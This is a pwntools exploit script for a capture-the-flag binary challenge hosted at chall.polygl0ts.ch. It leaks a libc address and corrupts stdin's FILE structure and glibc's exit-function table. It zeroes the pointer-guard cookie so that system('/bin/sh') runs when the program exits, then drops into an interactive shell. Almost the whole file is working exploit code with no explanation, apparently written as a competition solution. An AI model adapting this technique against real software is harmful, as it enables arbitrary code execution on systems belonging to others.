#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 12001 ./run
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './run')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chall.polygl0ts.ch'
port = int(args.PORT or 12001)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
br exit
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
io = start()

def prompt(m):
    io.sendlineafter("> ",m)

def promptib(i,prefix=b"",suffix=b""):
    prompt(prefix+bin(i)[2:].encode()+suffix)

def beep_boop(addr,idx,prefix=b"",suffix=b""):
    promptib(0)
    promptib(addr)
    promptib(idx,prefix=prefix,suffix=suffix)

def exit():
    promptib(1)

def printx(**kwargs):
    for k,v in kwargs.items():
        log.info(f"{k}: 0x{v:x}")

beep_boop(exe.sym.tries,0);
beep_boop(exe.sym.exe_path,65);
beep_boop(0,0);
for i in range(5 if args.LOCAL else 6):
    io.recvline();
io.recvuntil("Checking that 0 is in ")
libc = exe.libc
libc.address = int(io.recvline().split(b"-")[0],16) - 0x1d8000
printx(libc=libc.address)

def rol17(v):
    return ((v << 17) & (2 ** 64 - 1)) | (v >> 47)
payload = p64(rol17(libc.sym.system)) + p64(next(libc.search(b"/bin/sh\0")))
payload_start_idx = 48
beep_boop(libc.sym._IO_2_1_stdin_+16,0,prefix=b"0"*(payload_start_idx-1),suffix=payload)
funcs_entry = libc.address + 0x1d9fd8
cookie = libc.address - 0x2890

for i in range(16):
    beep_boop(funcs_entry+i,payload_start_idx+i)
for i in range(8):
    beep_boop(cookie+i,payload_start_idx) #0s

exit()
io.interactive()

